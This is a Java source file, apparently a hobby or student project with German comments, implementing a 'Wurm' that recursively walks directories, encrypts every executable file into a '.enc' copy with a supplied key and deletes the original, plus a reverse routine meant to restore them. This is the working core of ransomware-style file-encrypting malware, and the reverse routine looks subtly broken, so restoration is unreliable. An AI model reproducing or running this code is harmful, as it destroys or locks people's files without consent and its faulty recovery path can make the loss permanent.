package woFi.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.*;

public class FileAccesService
{
	private FileEncryptionService encryptionService = new FileEncryptionService();
	
	public List<File> startWurm(String startFile, String key) throws Exception
	{
		 List<File> filesReturn = new ArrayList<>();

		 File tempFile = new File(startFile);
		 File dir = tempFile;
//		 if(!tempFile.isDirectory())
//		 {
//			 dir = tempFile.getParentFile();
//		 }
		 File[] files = dir.listFiles();
		 
		 if (files != null) {
			 for (File file : files) {
				 if (file.isFile() && file.canExecute() && !file.isDirectory()) {
					//TODO das Return entfernen, da es nur kurz zum Testen ist
					filesReturn.add(file);
					String path = file.getAbsolutePath();
					int lastIndex = path.lastIndexOf(".");
					if (lastIndex != -1) {
						String outputFilePath = path.substring(0, lastIndex);
						File outputFile = new File(outputFilePath + ".enc");
						outputFile.createNewFile();
						encryptionService.encryptFile(file, outputFile, key);
						writeToFileA(outputFile, path.substring(lastIndex));
						file.delete();
					}
				 } else if (file.isDirectory()) {
					 startWurm(file.getAbsolutePath(), key); // Rekursion, um Unterverzeichnisse zu durchsuchen
				 }
			 }
		 }
		 return filesReturn;
	 }
	
	public List<File> reverseWurm(String startFile, String key) throws Exception
	{
		 List<File> filesReturn = new ArrayList<>();

		 File tempFile = new File(startFile);
		 File dir = tempFile;
//		 if(!tempFile.isDirectory())
//		 {
//			 dir = tempFile.getParentFile();
//		 }
		 File[] files = dir.listFiles();
		 
		 if (files != null) {
			 for (File file : files) {
				 if (file.isFile() && file.canExecute() && !file.isDirectory()) {
					//TODO das Return entfernen, da es nur kurz zum Testen ist
					filesReturn.add(file);
					String path = file.getAbsolutePath();
					int lastIndex = path.lastIndexOf(".");
					if (lastIndex != -1) {
						String outputFilePath = path.substring(0, lastIndex);
						String readFromFile = readFromFile(file);
						String outputFileEnding = readFromFile.substring(readFromFile.lastIndexOf("."));
						String outputFileContent = readFromFile.substring(0, readFromFile.lastIndexOf("."));
						File outputFile = new File(outputFilePath + outputFileEnding);
						outputFile.createNewFile();
						writeToFile(outputFile, outputFileContent);
						encryptionService.decryptFile(file, outputFile, key);
						file.delete();
					}
				 } else if (file.isDirectory()) {
					 reverseWurm(file.getAbsolutePath(), key); // Rekursion, um Unterverzeichnisse zu durchsuchen
				 }
			 }
		 }
		 return filesReturn;
	 }
	
	private void writeToFileA(File file, String content)
	{
		   try {
	            FileWriter fileWriter = new FileWriter(file, true);
	            fileWriter.write(content);
	            fileWriter.close();
	            System.out.println("Content appended to the file: " + file);
	        } catch (IOException e) {
	            System.out.println("An error occurred while appending content to the file: " + e.getMessage());
	        }
	}
	private void writeToFile(File file, String content)
	{
		try {
			FileWriter fileWriter = new FileWriter(file, false);
			fileWriter.write(content);
			fileWriter.close();
			System.out.println("Content appended to the file: " + file);
		} catch (IOException e) {
			System.out.println("An error occurred while appending content to the file: " + e.getMessage());
		}
	}
	
	private String readFromFile(File file)
	{
		StringBuilder content = new StringBuilder();
        
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line);
            }
        } catch (IOException e) {
        	//NIX
        }
        
        return content.toString();
	}
}
